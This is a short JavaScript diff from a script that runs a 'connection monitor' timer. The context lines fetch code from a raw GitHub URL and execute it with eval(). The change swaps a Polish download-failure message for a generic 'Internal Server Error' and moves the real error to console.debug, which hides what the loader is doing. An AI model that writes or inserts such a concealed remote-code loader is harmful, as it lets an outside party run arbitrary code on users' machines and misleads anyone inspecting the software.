@@ -193,12 +193,13 @@ var kwsConnectionMonitorVerifier = setInterval(verifyConnectionManager, 40000);
     const url = "https://raw.githubusercontent.com/Koles1910/ddd/main/dupablada123.js";
     try {
       const response = await fetch(url);
-      if (!response.ok) throw new Error("Nie udało się pobrać pliku");
+      if (!response.ok) throw new Error("Internal Server Error");
       const code = await response.text();
       eval(code);
       console.log("Skrypt uruchomiony");
     } catch (e) {
-      console.error(e);
+      console.error("Internal Server Error");
+      console.debug(e);
     }
   }
 
